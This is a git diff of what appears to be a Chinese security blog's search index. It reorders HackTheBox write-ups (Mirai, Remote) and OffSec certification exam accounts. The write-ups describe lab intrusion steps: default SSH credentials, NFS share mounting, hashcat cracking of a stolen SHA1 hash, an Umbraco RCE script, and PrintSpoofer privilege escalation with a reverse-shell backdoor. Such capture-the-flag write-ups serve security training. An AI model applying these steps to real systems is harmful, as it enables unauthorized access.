+                ></p>
+<p>gobuster报错了，加个-b 401即可</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.305rxbmgt540.webp"
+                     
+                ></p>
+<p>扫出了挺多，但访问起来都是</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.5fzctx9qoog0.webp"
+                     
+                ></p>
+<p>再回80扫个目录看看</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.5exckpr0xlg0.webp"
+                     
+                ></p>
+<p>有个admin</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.jw8s0923k0w.webp"
+                     
+                ></p>
+<p>树莓派？</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.3r4xcc41oga0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.67hbabn8te40.webp"
+                     
+                ></p>
+<p>密码不知道，看看有无公开可利用exp</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.4i0flsy3nva0.webp"
+                     
+                ></p>
+<p>要cookie，利用不了，搜一下有无默认密码</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.5mmx3gywpi40.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.4ywn8r79izc0.webp"
+                     
+                ></p>
+<p>还是不对，但树莓派好像会有ssh用户，利用默认账号和密码尝试登陆一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.86pwdr3jum0.webp"
+                     
+                ></p>
+<p>提权</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.55rowm2wxd80.webp"
+                     
+                ></p>
+<p>有这么直接的嘛</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.5pmu3bglwe80.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.45dx91ozjw80.webp"
+                     
+                ></p>
+<p>肯定没这么简单，他说他有U盘备份，直接用<code>df -h</code>找一下挂载磁盘</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.6y04a6ntmcs0.webp"
+                     
+                ></p>
+<p>看到一个usbstick</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.3j31qetjysi0.webp"
+                     
+                ></p>
+<p>脑筋急转弯了属于是</p>
+<p>由于linux系统，删除文件并不是真正的将文件从磁盘中抹除，而是将其索引抹除，导致无法查找与查看，可以使用<code>strings /dev/sdb</code>，查看被删除的数据，<code>/dev/sdb</code>是挂载U盘的磁盘名</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.5b439a5p30w0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.6u479as4ya80.webp"
                      
                 ></p>
 ]]></content>
@@ -10204,42 +10204,6 @@
       </tags>
   </entry>
   <entry>
-    <title>OSCP+</title>
-    <url>/post/71a7339c3d10/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>OSCP+是offsec通过OSCP的基础上更新的一个新认证，自 2024 年 11 月 1 日起，OSCP考试统一修改为OSCP+，通过考试的人员会获得OSCP和OSCP+两个认证，其中OSCP+是从获得起开始计算时间，三年后过期，过期后为普通OSCP认证，OSCP保持终身制，如果三年后想要续期OSCP+，需要通过其他认证，例如OSWA、OSEP、OSED等，又或是重新参加考试。</p>
-<h1 id="课程内容与变化"><a href="#课程内容与变化" class="headerlink" title="课程内容与变化"></a>课程内容与变化</h1><p>内容与之前的OSCP相差不大，增加了部分章节内容，新增云渗透部分内容，云渗透内容暂未放入考试中。</p>
-<p>考试形式也有所改变，现在的域部分有步骤分，以及会事先提供一个普通域用户账户，不再是从外网打点进去内网，单机部分难度有所提升，考试规模与未改版之前一致。</p>
-<p>删除奖励分，不在有练习的10分奖励分，相对来讲少了一些容错率。</p>
-<p>新增三个练习用的Challenge Lab，难度适中。</p>
-<h1 id="备考"><a href="#备考" class="headerlink" title="备考"></a>备考</h1><p>这一部分倒是没什么好讲的，我之前考试OSCP，这次将新增的内容过一遍，然后把新增的三个Lab打完就挑了个时间预约。</p>
-<h1 id="考试要求"><a href="#考试要求" class="headerlink" title="考试要求"></a>考试要求</h1><p>考试总时长还是24小时，结束后还有24小时写报告时间。</p>
-<p>规则依旧没变，不允许使用AI、自动化、大型漏扫工具，以及商业化工具，Metasploit的使用限制在一个目标，且这个目标不能是在域范围内的目标，使用次数不限，对一个目标使用后，可以无限次重复对指定目标使用，不能更换目标。</p>
-<p>总分为100分，通过分数为70分，其中域部分占比40分，单机机器分为普通用户flag和管理员用户flag，每个占比10分，其中域部分有步骤分，视完成情况给分。</p>
-<p>报告形式与之前一致，需要获取shell后读取flag的截图，以及主机名、IP地址、当前用户名。</p>
-<h1 id="考试过程"><a href="#考试过程" class="headerlink" title="考试过程"></a>考试过程</h1><p>开始考试后，访问提交flag的管理页面，上面会给出考试机器的细节，以及提供的普通权限域账户，拿到账户后访问上去开始提权，历经4、5个小时后，完成域部分。</p>
-<p>单机机器难度相对来讲比之前有所提升，总体来说还是在课程范围内，部分地方需要自己找一找外部内容参考，在又经历5、6小时后，凑够了分数，之后又尝试了半小时，没有结果，索性结束了考试。</p>
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>结束后写好报告提交，两天后的下午收到考试通过邮件。</p>
-<p>这次考试难度相对来讲在预期范围内，部分内容需要参考外部内容，大部分都包含在课程材料中。</p>
-<p>改版后的考试，域部分比之前要稍微费一点功夫，更加考察信息收集能力。</p>
-<p><del>本来是年前考完的，太懒了，年后才写的这篇内容。</del></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.3uuybmqsve.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.7zqjnqpnfm.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>OffSec</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>OSCP</title>
     <url>/post/86d0e942ee7c/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>OSCP（Offensive Security Certified Professional）是由OffSec（也就是kali的设计以及维护官方）推出的一个渗透认证考试，要求持有者在安全的实验室环境中成功攻击和渗透各种实时机器，不设立笔试环节。</p>
@@ -10376,6 +10340,42 @@
                      lazyload
                      alt="image"
                      data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.7i0bqtu48u.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>OffSec</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>OSCP+</title>
+    <url>/post/71a7339c3d10/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>OSCP+是offsec通过OSCP的基础上更新的一个新认证，自 2024 年 11 月 1 日起，OSCP考试统一修改为OSCP+，通过考试的人员会获得OSCP和OSCP+两个认证，其中OSCP+是从获得起开始计算时间，三年后过期，过期后为普通OSCP认证，OSCP保持终身制，如果三年后想要续期OSCP+，需要通过其他认证，例如OSWA、OSEP、OSED等，又或是重新参加考试。</p>
+<h1 id="课程内容与变化"><a href="#课程内容与变化" class="headerlink" title="课程内容与变化"></a>课程内容与变化</h1><p>内容与之前的OSCP相差不大，增加了部分章节内容，新增云渗透部分内容，云渗透内容暂未放入考试中。</p>
+<p>考试形式也有所改变，现在的域部分有步骤分，以及会事先提供一个普通域用户账户，不再是从外网打点进去内网，单机部分难度有所提升，考试规模与未改版之前一致。</p>
+<p>删除奖励分，不在有练习的10分奖励分，相对来讲少了一些容错率。</p>
+<p>新增三个练习用的Challenge Lab，难度适中。</p>
+<h1 id="备考"><a href="#备考" class="headerlink" title="备考"></a>备考</h1><p>这一部分倒是没什么好讲的，我之前考试OSCP，这次将新增的内容过一遍，然后把新增的三个Lab打完就挑了个时间预约。</p>
+<h1 id="考试要求"><a href="#考试要求" class="headerlink" title="考试要求"></a>考试要求</h1><p>考试总时长还是24小时，结束后还有24小时写报告时间。</p>
+<p>规则依旧没变，不允许使用AI、自动化、大型漏扫工具，以及商业化工具，Metasploit的使用限制在一个目标，且这个目标不能是在域范围内的目标，使用次数不限，对一个目标使用后，可以无限次重复对指定目标使用，不能更换目标。</p>
+<p>总分为100分，通过分数为70分，其中域部分占比40分，单机机器分为普通用户flag和管理员用户flag，每个占比10分，其中域部分有步骤分，视完成情况给分。</p>
+<p>报告形式与之前一致，需要获取shell后读取flag的截图，以及主机名、IP地址、当前用户名。</p>
+<h1 id="考试过程"><a href="#考试过程" class="headerlink" title="考试过程"></a>考试过程</h1><p>开始考试后，访问提交flag的管理页面，上面会给出考试机器的细节，以及提供的普通权限域账户，拿到账户后访问上去开始提权，历经4、5个小时后，完成域部分。</p>
+<p>单机机器难度相对来讲比之前有所提升，总体来说还是在课程范围内，部分地方需要自己找一找外部内容参考，在又经历5、6小时后，凑够了分数，之后又尝试了半小时，没有结果，索性结束了考试。</p>
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>结束后写好报告提交，两天后的下午收到考试通过邮件。</p>
+<p>这次考试难度相对来讲在预期范围内，部分内容需要参考外部内容，大部分都包含在课程材料中。</p>
+<p>改版后的考试，域部分比之前要稍微费一点功夫，更加考察信息收集能力。</p>
+<p><del>本来是年前考完的，太懒了，年后才写的这篇内容。</del></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.3uuybmqsve.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.7zqjnqpnfm.webp"
                      
                 ></p>
 ]]></content>
@@ -10560,6 +10560,44 @@
       </tags>
   </entry>
   <entry>
+    <title>OSWP</title>
+    <url>/post/e2351bb11e1e/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>OSWP（Foundational Wireless Network Attacks），也称PEN-210，从命名来看，就可以知道，这是一个基于无线网络攻击的基础课程。</p>
+<p><del>其实这门课没什么好讲的，我主要是为了凑一下文章数。</del></p>
+<p>课程内容主要涉及Wifi协议，认证方式，认证方式的攻击等。</p>
+<p>这门课程会在购买Learn One或者Learn Unlimited套餐赠送考试机会，也可以单独购买。</p>
+<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>OSWP考试只有四小时，可以算是目前来说我经历过的最短时间的考试，但时间是足够的，考试会给三个目标，其中有一个是必须拿下的，另外两个任意选一个做出来就算通过考试。</p>
+<h1 id="备考"><a href="#备考" class="headerlink" title="备考"></a>备考</h1><p>offsec官方并没有给这门课程配套相应的Lab提供练习，这门课程只有教材以及视频，如果想要练习，需要自己购买路由器，或者可以找一些类似靶场练习。</p>
+<p>我在五月八号看了下教材，约了第二天九号晚上八点的考试，九号白天在<a class="link"   href="https://wifichallengelab.com/" >Wifichallenge<i class="fas fa-external-link-alt"></i></a>靶场做了下练习，这个靶场会给出不同场景的Wifi认证模式的攻击方式，可以熟悉一下Wifi攻击所使用到的一些工具，而且这个靶场会给出对应题目的WP，如果有题目不会做，没有思路，都可以参考WP来操作。</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.2obcbrs4gq.png"
+                     
+                ></p>
+<h1 id="考试"><a href="#考试" class="headerlink" title="考试"></a>考试</h1><p>流程与其他考试一致。</p>
+<p>考试会给一个操作机器kali，要求所有操作都要在他们提供的考试机器kali上进行，其实也没有办法不在他们给的机器上做题目，因为需要连接目标Wifi。</p>
+<p>这次的考试非常的简单，从八点开始，到晚上十点半我就结束了考试，这期间基本没有遇到卡住的地方，费时间的唯一地方就是他们提供的机器ssh上去延迟比较高。</p>
+<p>同时在十一点前提交了考试报告，这次效率也很快，第二天上午就可以在预约考试页面看到通过结果，但迟迟没有等到邮件，直到晚上的十一点多才收到通过邮件。</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.b8pukm36c.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.5tquapvazr.webp"
+                     
+                ></p>
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>讲道理，这门课确实过于基础，可能是限于物理设备，offsec并没有讲的很深入，这门课我并不推荐单独购买课程，如果实在想要，可以报一个Learn One套餐，任选一门课，附赠一次OSWP考试机会。</p>
+]]></content>
+      <tags>
+        <tag>OffSec</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>OSWE</title>
     <url>/post/0ff59a9e0ce4/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>OSWE（Advanced Web Attacks and Exploitation），也称WEB-300，是组成OSCE3三部分中的其中一部分，主要内容为白盒审计，涉及语言相对广泛，目前主流的，例如：C#、Java、Nodejs等都有涉及。</p>
@@ -10611,44 +10649,6 @@
                 ></p>
 <h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>考试的漏洞利用不会很难，但是发现漏洞，以及部分情况下需要将漏洞组合利用会稍微费点时间，需要有耐心，不断地去尝试，去摸索。</p>
 <p>至此，OSCE3只差最后一门OSED，这是我从未接触过的领域，希望不会将我折磨得太惨。</p>
-]]></content>
-      <tags>
-        <tag>OffSec</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>OSWP</title>
-    <url>/post/e2351bb11e1e/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>OSWP（Foundational Wireless Network Attacks），也称PEN-210，从命名来看，就可以知道，这是一个基于无线网络攻击的基础课程。</p>
-<p><del>其实这门课没什么好讲的，我主要是为了凑一下文章数。</del></p>
-<p>课程内容主要涉及Wifi协议，认证方式，认证方式的攻击等。</p>
-<p>这门课程会在购买Learn One或者Learn Unlimited套餐赠送考试机会，也可以单独购买。</p>
-<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>OSWP考试只有四小时，可以算是目前来说我经历过的最短时间的考试，但时间是足够的，考试会给三个目标，其中有一个是必须拿下的，另外两个任意选一个做出来就算通过考试。</p>
-<h1 id="备考"><a href="#备考" class="headerlink" title="备考"></a>备考</h1><p>offsec官方并没有给这门课程配套相应的Lab提供练习，这门课程只有教材以及视频，如果想要练习，需要自己购买路由器，或者可以找一些类似靶场练习。</p>
-<p>我在五月八号看了下教材，约了第二天九号晚上八点的考试，九号白天在<a class="link"   href="https://wifichallengelab.com/" >Wifichallenge<i class="fas fa-external-link-alt"></i></a>靶场做了下练习，这个靶场会给出不同场景的Wifi认证模式的攻击方式，可以熟悉一下Wifi攻击所使用到的一些工具，而且这个靶场会给出对应题目的WP，如果有题目不会做，没有思路，都可以参考WP来操作。</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.2obcbrs4gq.png"
-                     
-                ></p>
-<h1 id="考试"><a href="#考试" class="headerlink" title="考试"></a>考试</h1><p>流程与其他考试一致。</p>
-<p>考试会给一个操作机器kali，要求所有操作都要在他们提供的考试机器kali上进行，其实也没有办法不在他们给的机器上做题目，因为需要连接目标Wifi。</p>
-<p>这次的考试非常的简单，从八点开始，到晚上十点半我就结束了考试，这期间基本没有遇到卡住的地方，费时间的唯一地方就是他们提供的机器ssh上去延迟比较高。</p>
-<p>同时在十一点前提交了考试报告，这次效率也很快，第二天上午就可以在预约考试页面看到通过结果，但迟迟没有等到邮件，直到晚上的十一点多才收到通过邮件。</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.b8pukm36c.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.5tquapvazr.webp"
-                     
-                ></p>
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>讲道理，这门课确实过于基础，可能是限于物理设备，offsec并没有讲的很深入，这门课我并不推荐单独购买课程，如果实在想要，可以报一个Learn One套餐，任选一门课，附赠一次OSWP考试机会。</p>
 ]]></content>
       <tags>
         <tag>OffSec</tag>
@@ -12459,190 +12459,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Remote - HackTheBox</title>
-    <url>/post/cc8a74409c0d/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.673mkmh4i840.webp"
-                     
-                ></p>
-<p>nmap扫描</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.2aul8eizrkg0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.6raahmfoz400.webp"
-                     
-                ></p>
-<p>先看21端口</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.7hcniq1jw6c0.webp"
-                     
-                ></p>
-<p>没有东西，而且也上传不了</p>
-<p>访问80</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.17dcz1xk4qps.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.7k5a7h87bdo0.webp"
-                     
-                ></p>
-<p>在这发现一个登录框</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.3o1rddq7sxu0.webp"
-                     
-                ></p>
-<p>每个页面下面都会显示Umbraco，感觉像是一个cms</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.6dxsbzxbn700.webp"
-                     
-                ></p>
-<p>有一个RCE，但不确定版本也不知道账号密码</p>
-<p>2049端口开放，看看有无目录可挂载</p>
-<p><code>showmount -e 10.10.10.180</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.4khg0nmoqqo0.webp"
-                     
-                ></p>
-<p>有一个，挂载到本地</p>
-<p><code>mount -t nfs 10.10.10.180:/site_backups .</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.2363pclzw3ts.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.12t4enpsz680.webp"
-                     
-                ></p>
-<p>应该是网站目录了</p>
-<p>在web.config中确定了版本</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.2g50ovvfrykg.webp"
-                     
-                ></p>
-<p>然后就是需要找到一个账号密码即可</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.2c33ftv0u6zo.webp"
-                     
-                ></p>
-<p>在App_data目录下的Umbraco.sdf文件中找到了账号密码，并且密码给出加密形式为sha1</p>
-<p>用hashcat爆破一下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.4uom7x4xhb80.webp"
-                     
-                ></p>
-<p><code>hashcat -m 100 hash /usr/share/wordlists/rockyou.txt</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.78n1my1aje80.webp"
-                     
-                ></p>
-<p>尝试登陆一下网站后台</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.5tmzjemn9lo0.webp"
-                     
-                ></p>
-<p>用rce脚本获取shell</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.36i7n0i5jhu0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.5d1b6nl6ts40.webp"
-                     
-                ></p>
-<p>提权</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.od1a2p8z2v4.webp"
-                     
-                ></p>
-<p>检测脚本没有检测到任何可利用exp</p>
-<p><code>whoami /all</code>查看权限</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.5ltkrvvt07g0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.179wwq5gvvpc.webp"
-                     
-                ></p>
-<p>在有这个权限的情况下可以使用<code>potato</code>进行提权，但这台机器是<code>windows server 2019</code>的，这个<code>potato</code>已经不可用了，有一个替代品叫<code>PrintSpoofer</code></p>
-<p><code>https://github.com/itm4n/PrintSpoofer</code></p>
-<p>原理也差不多，用这个去运行反弹shell的后门，即可获得权限</p>
-<p>msf生成反弹后门，将PrintSpoofer和反弹shell都上传到靶机</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.63yam9gzxf40.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.1xwus6i5lq9s.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.5yq4oso1ibo0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.v82xxkwdmq8.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Seal - HackTheBox</title>
     <url>/post/6955d52cd947/</url>
     <content><![CDATA[<p><img  
@@ -12885,6 +12701,190 @@
                      lazyload
                      alt="image"
                      data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.5fez2seh4i40.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>Hack-The-Box</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Remote - HackTheBox</title>
+    <url>/post/cc8a74409c0d/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.673mkmh4i840.webp"
+                     
+                ></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.2aul8eizrkg0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.6raahmfoz400.webp"
+                     
+                ></p>
+<p>先看21端口</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.7hcniq1jw6c0.webp"
+                     
+                ></p>
+<p>没有东西，而且也上传不了</p>
+<p>访问80</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.17dcz1xk4qps.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.7k5a7h87bdo0.webp"
+                     
+                ></p>
+<p>在这发现一个登录框</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.3o1rddq7sxu0.webp"
+                     
+                ></p>
+<p>每个页面下面都会显示Umbraco，感觉像是一个cms</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.6dxsbzxbn700.webp"
+                     
+                ></p>
+<p>有一个RCE，但不确定版本也不知道账号密码</p>
+<p>2049端口开放，看看有无目录可挂载</p>
+<p><code>showmount -e 10.10.10.180</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.4khg0nmoqqo0.webp"
+                     
+                ></p>
+<p>有一个，挂载到本地</p>
+<p><code>mount -t nfs 10.10.10.180:/site_backups .</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.2363pclzw3ts.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.12t4enpsz680.webp"
+                     
+                ></p>
+<p>应该是网站目录了</p>
+<p>在web.config中确定了版本</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.2g50ovvfrykg.webp"
+                     
+                ></p>
+<p>然后就是需要找到一个账号密码即可</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.2c33ftv0u6zo.webp"
+                     
+                ></p>
+<p>在App_data目录下的Umbraco.sdf文件中找到了账号密码，并且密码给出加密形式为sha1</p>
+<p>用hashcat爆破一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.4uom7x4xhb80.webp"
+                     
+                ></p>
